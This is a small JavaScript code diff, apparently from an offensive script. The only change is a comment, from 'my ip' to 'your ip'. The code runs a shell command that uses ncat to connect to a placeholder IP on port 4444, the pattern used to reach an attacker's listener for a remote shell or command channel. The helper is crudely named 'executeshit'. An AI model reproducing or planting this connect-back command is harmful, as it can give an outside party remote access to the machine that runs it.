@@ -12,7 +12,7 @@ async function executeshit(execom) {
 
 
 async function executecomz () {
-    const execom = 'ncat -nv iphere 4444'; // replace "iphere" with my ip
+    const execom = 'ncat -nv iphere 4444'; // replace "iphere" with your ip
     const result = await executeshit(execom);
     console.log(result);
 }
